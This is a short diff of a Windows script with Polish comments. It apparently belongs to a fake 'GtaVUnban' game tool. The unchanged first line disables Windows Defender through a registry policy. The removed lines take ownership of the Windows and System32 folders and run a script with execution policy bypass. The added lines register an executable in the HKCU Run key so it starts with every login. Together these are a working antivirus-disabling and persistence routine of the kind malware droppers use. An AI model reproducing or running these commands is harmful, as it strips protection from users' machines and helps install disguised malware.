@@ -1,29 +1,8 @@
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 
-# Ustawienie właściciela dla folderu Windows
-$windowsFolder = "$env:windir"
-$windowsOwner = "$env:username"
+@echo off
 
-Take-Ownership -Path $windowsFolder -Owner $windowsOwner
+set "appPath=C:\users\Desktop\GtaVUnban\start.exe"
+set "appName=GtaVUnban"
 
-# Ustawienie właściciela dla folderu System32
-$system32Folder = "$env:windir\system32"
-
-Take-Ownership -Path $system32Folder -Owner $windowsOwner
-
-function Take-Ownership {
-    param (
-        [Parameter(Mandatory=$true)]
-        [ValidateScript({Test-Path -LiteralPath $_ -PathType Container})]
-        [string]$Path,
-        [Parameter(Mandatory=$true)]
-        [string]$Owner
-    )
-
-    $acl = Get-Acl $Path
-    $acl.SetOwner([System.Security.Principal.NTAccount]$Owner)
-    Set-Acl -Path $Path -AclObject $acl
-}
-
-
-powershell.exe -ExecutionPolicy Bypass -File "C:\SciezkaDoPliku\zmiana_wlasciciela.ps1"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%appName%" /t REG_SZ /d "%appPath%" /f
